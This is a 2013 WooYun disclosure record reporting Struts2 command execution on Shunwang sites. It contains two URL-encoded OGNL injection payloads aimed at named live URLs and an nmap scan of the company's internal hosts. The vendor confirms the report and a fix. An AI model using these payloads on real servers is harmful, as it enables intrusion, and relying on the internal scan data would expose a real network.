{"id": 63059, "wybug_id": "wooyun-2013-033230", "wybug_title": "杭州顺网某系统命令执行", "wybug_corp": "shunwang.com", "wybug_author": "啦绯哥", "wybug_date": "2013-08-02 10:42", "wybug_open_date": "2013-09-16 10:43", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-16：\t细节向公众公开  简要描述： rt 详细说明：  本来想做一次比较深入的渗透测试，由于工作和时间的原因，没办法再进行下去了！贵公司好像最近在做业务调整，不知道有么有礼物。现发现重要问题如下：蝌蚪网址导航命令执行：http://123.kedou.com/help.do?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7DPC保鲜盒业务平台命令执行：该IP好像部署了好几个网站：http://content.icebox.cn   http://pp.icebox.cnhttp://ssoserver.icebox.cn/toLogin.do?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D   漏洞证明：  \n\n\n\nHost: 172.16.15.29 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 80/open/tcp//http/nginx 1.0.15/, 111/open/tcp//rpcbind/2 (RPC #100000)/, 1998/open/tcp//http/BaseHTTPServer 0.3 (Python SimpleXMLRPCServer; Python 2.5.2)/, 3000/open/tcp//http/WEBrick httpd 1.3.1 (Ruby 1.8.7 (2012-06-29))/, 3306/open/tcp//mysql/MySQL (unauthorized)/\tIgnored State: closed (994)\tOS: Linux 2.6.9 - 2.6.30\tSeq Index: 208\tIP ID Seq: All zerosHost: 172.16.15.37 ()\tPorts: 21/open/tcp//ftp/vsftpd 2.3.0/, 22/open/tcp//ssh/OpenSSH 5.5p1 Debian 4ubuntu5 (Ubuntu Linux; protocol 2.0)/, 3306/open/tcp//mysql/MySQL 5.1.49-1ubuntu8.1/\tIgnored State: closed (997)\tOS: Linux 2.6.19 - 2.6.35\tSeq Index: 203\tIP ID Seq: All zerosHost: 172.16.15.62 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 53/open/tcp//domain/ISC BIND 9.6.1-P1/, 80/open/tcp//http?//, 111/open/tcp//rpcbind/2 (RPC #100000)/, 3306/open/tcp//mysql/MySQL (unauthorized)/, 8080/open/tcp//http-proxy?//\tIgnored State: closed (994)\tOS: Linux 2.6.9 - 2.6.30\tSeq Index: 177\tIP ID Seq: All zerosHost: 172.16.15.63 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 53/open/tcp//domain/ISC BIND 9.6.1-P1/, 80/open/tcp//http?//, 111/open/tcp//rpcbind/2 (RPC #100000)/, 3306/open/tcp//mysql/MySQL (unauthorized)/, 8080/open/tcp//http-proxy?//\tIgnored State: closed (994)\tOS: Linux 2.6.9 - 2.6.30|Linux 2.6.32\tSeq Index: 197\tIP ID Seq: All zerosHost: 172.16.15.93 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 80/open/tcp//http/lighttpd 1.4.20/, 111/open/tcp//rpcbind/2 (RPC #100000)/, 2049/open/tcp//nfs/2-4 (RPC #100003)/, 3306/open/tcp//mysql/MySQL (unauthorized)/\tIgnored State: closed (995)\tOS: Linux 2.6.9 - 2.6.30\tSeq Index: 204\tIP ID Seq: All zerosHost: 172.16.15.98 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 80/open/tcp//http/nginx 0.8.54/, 111/open/tcp//rpcbind/2 (RPC #100000)/, 3306/open/tcp//mysql/MySQL 5.1.54-log/\tIgnored State: closed (996)\tOS: Linux 2.6.9 - 2.6.30\tSeq Index: 206\tIP ID Seq: All zerosHost: 172.16.15.103 ()\tPorts: 23/open/tcp//telnet/Microsoft Windows XP telnetd/, 135/open/tcp//msrpc/Microsoft Windows RPC/, 139/open/tcp//netbios-ssn//, 1025/open/tcp//msrpc/Microsoft Windows RPC/, 3306/open/tcp//mysql/MySQL (unauthorized)/, 3389/open/tcp//ms-wbt-server/Microsoft Terminal Service/, 9900/open/tcp//iua?//\tIgnored State: closed (993)\tOS: Microsoft Windows XP SP2 or Windows Server 2003 SP1 or SP2\tSeq Index: 261\tIP ID Seq: IncrementalHost: 172.16.15.172 ()\tPorts: 25/open/tcp//smtp/Microsoft ESMTP 7.5.7601.17514/, 53/open/tcp//domain/Microsoft DNS 6.1.7601/, 80/open/tcp//http/Microsoft IIS httpd 7.5/, 81/open/tcp//http/Microsoft IIS httpd 7.5/, 88/open/tcp//kerberos-sec/Windows 2003 Kerberos (server time: 2013-05-18 12:57:27Z)/, 135/open/tcp//msrpc/Microsoft Windows RPC/, 139/open/tcp//netbios-ssn//, 389/open/tcp//ldap//, 445/open/tcp//netbios-ssn//, 464/open/tcp//kpasswd5?//, 593/open/tcp//ncacn_http/Microsoft Windows RPC over HTTP 1.0/, 636/open/tcp//tcpwrapped//, 1433/open/tcp//ms-sql-s/Microsoft SQL Server 2008 R2 10.50.1790.00; RTM+/, 1688/open/tcp//msrpc/Microsoft Windows RPC/, 1801/open/tcp//msmq?//, 2103/open/tcp//msrpc/Microsoft Windows RPC/, 2105/open/tcp//msrpc/Microsoft Windows RPC/, 2107/open/tcp//msrpc/Microsoft Windows RPC/, 2382/open/tcp//ms-olap3?//, 2383/open/tcp//ms-olap4?//, 3268/open/tcp//ldap//, 3269/open/tcp//tcpwrapped//, 3300/open/tcp//mysql/MySQL (unauthorized)/, 3306/open/tcp//mysql/MySQL (unauthorized)/, 3389/open/tcp//ms-wbt-server/Microsoft Terminal Service/, 8082/open/tcp//blackice-alerts?//, 8084/open/tcp//http/Apache Tomcat|Coyote JSP engine 1.1/, 8093/open/tcp//unknown//, 9999/open/tcp//http/Microsoft IIS httpd 7.5/, 49152/open/tcp//msrpc/Microsoft Windows RPC/, 49153/open/tcp//msrpc/Microsoft Windows RPC/, 49154/open/tcp//msrpc/Microsoft Windows RPC/, 49155/open/tcp//msrpc/Microsoft Windows RPC/, 49157/open/tcp//ncacn_http/Microsoft Windows RPC over HTTP 1.0/, 49158/open/tcp//msrpc/Microsoft Windows RPC/, 49165/open/tcp//msrpc/Microsoft Windows RPC/\tIgnored State: closed (964)\tOS: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, or Windows 8\tSeq Index: 258\tIP ID Seq: IncrementalHost: 172.16.16.61 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 111/open/tcp//rpcbind/2 (RPC #100000)/, 873/open/tcp//rsync/(protocol version 30)/, 3306/open/tcp//mysql/MySQL 5.1.57-rel12.8-log/, 5666/open/tcp//tcpwrapped//\tIgnored State: closed (995)\tOS: Linux 2.6.9 - 2.6.30\tSeq Index: 196\tIP ID Seq: All zerosHost: 172.16.16.84 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 80/open/tcp//http?//, 111/open/tcp//rpcbind/2 (RPC #100000)/, 1999/open/tcp//ssl|tcp-id-port?//, 3306/open/tcp//mysql/MySQL (unauthorized)/, 5666/open/tcp//tcpwrapped//\tIgnored State: closed (994)\tOS: Linux 2.6.9 - 2.6.30|Linux 2.6.32\tSeq Index: 193\tIP ID Seq: All zerosHost: 172.16.16.93 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 111/open/tcp//rpcbind/2 (RPC #100000)/, 873/open/tcp//rsync/(protocol version 30)/, 3306/open/tcp//mysql/MySQL 5.1.57-rel12.8-log/, 5666/open/tcp//tcpwrapped//\tIgnored State: closed (995)\tOS: Linux 2.6.9 - 2.6.30\tSeq Index: 201\tIP ID Seq: All zerosHost: 172.16.16.196 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 111/open/tcp//rpcbind/2 (RPC #100000)/, 873/open/tcp//rsync/(protocol version 30)/, 3306/open/tcp//mysql/MySQL 5.1.57-rel12.8-log/, 5666/open/tcp//tcpwrapped//\tIgnored State: closed (995)\tOS: Linux 2.6.13 - 2.6.32|Linux 2.6.18 - 2.6.32|Linux 2.6.22 - 2.6.23|Linux 2.6.9|Linux 2.6.9 - 2.6.24|Linux 2.6.9 - 2.6.30|Linux 2.6.9 - 2.6.33|Linux 2.6.32Host: 172.16.17.51 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 111/open/tcp//rpcbind/2 (RPC #100000)/, 873/open/tcp//rsync/(protocol version 30)/, 3306/open/tcp//mysql/MySQL 5.1.57-rel12.8-log/\tIgnored State: closed (996)\tOS: Linux 2.6.9 - 2.6.30|Linux 2.6.32\tSeq Index: 199\tIP ID Seq: All zerosHost: 172.16.17.52 ()\tStatus: UpHost: 172.16.17.52 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 111/open/tcp//rpcbind/2 (RPC #100000)/, 3306/open/tcp//mysql/MySQL (unauthorized)/\tIgnored State: closed (997)\tOS: Linux 2.6.9 - 2.6.30\tSeq Index: 204\tIP ID Seq: All zerosHost: 172.16.17.51 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 111/open/tcp//rpcbind/2 (RPC #100000)/, 873/open/tcp//rsync/(protocol version 30)/, 3306/open/tcp//mysql/MySQL 5.1.57-rel12.8-log/\tIgnored State: closed (996)\tOS: Linux 2.6.9 - 2.6.30\tSeq Index: 201\tIP ID Seq: All zerosHost: 172.16.17.52 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 111/open/tcp//rpcbind/2 (RPC #100000)/, 3306/open/tcp//mysql/MySQL (unauthorized)/\tIgnored State: closed (997)\tOS: Linux 2.6.9 - 2.6.30\tSeq Index: 200\tIP ID Seq: All zerosHost: 172.16.17.85 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 111/open/tcp//rpcbind/2 (RPC #100000)/, 873/open/tcp//rsync/(protocol version 30)/, 3306/open/tcp//mysql/MySQL 5.1.57-rel12.8-log/, 5666/open/tcp//tcpwrapped//\tIgnored State: closed (995)\tOS: Linux 2.6.18 - 2.6.32\tSeq Index: 249\tIP ID Seq: All zerosHost: 172.16.17.161 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 111/open/tcp//rpcbind/2 (RPC #100000)/, 873/open/tcp//rsync/(protocol version 30)/, 3306/open/tcp//mysql/MySQL 5.1.57-rel12.8-log/\tIgnored State: closed (996)\tOS: Linux 2.6.18 - 2.6.32\tSeq Index: 261\tIP ID Seq: All zerosHost: 172.16.17.169 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 111/open/tcp//rpcbind/2 (RPC #100000)/, 873/open/tcp//rsync/(protocol version 30)/, 3306/open/tcp//mysql/MySQL 5.1.57-rel12.8-log/\tIgnored State: closed (996)\tOS: Linux 2.6.18 - 2.6.32\tSeq Index: 258\tIP ID Seq: All zerosHost: 172.16.21.16 ()\tPorts: 22/open/tcp//ssh/OpenSSH 4.3 (protocol 2.0)/, 111/open/tcp//rpcbind/2 (RPC #100000)/, 3306/open/tcp//mysql/MySQL 5.1.57-rel12.8-log/, 5666/open/tcp//tcpwrapped//\tIgnored State: closed (996)\tOS: Linux 2.6.18 - 2.6.32\tSeq Index: 260\tIP ID Seq: All zerosHost: 172.16.22.11 ()\tPorts: 22/open/tcp//ssh/OpenSSH 5.3 (protocol 2.0)/, 80/open/tcp//http/Apache httpd 2.2.15 ((CentOS))/, 111/open/tcp//rpcbind/2-4 (RPC #100000)/, 3306/open/tcp//mysql/MySQL (unauthorized)/\tIgnored State: closed (996)\tOS: Linux 2.6.32 - 3.6\tSeq Index: 255\tIP ID Seq: All zeros   修复方案：  补丁   版权声明：转载请注明来源 啦绯哥@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-08-02 15:06 厂商回复： 感谢关注顺网安全，已经安排人员进行修复。 最新状态： 2013-10-29：已经修复完成，感谢关注顺网安全  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}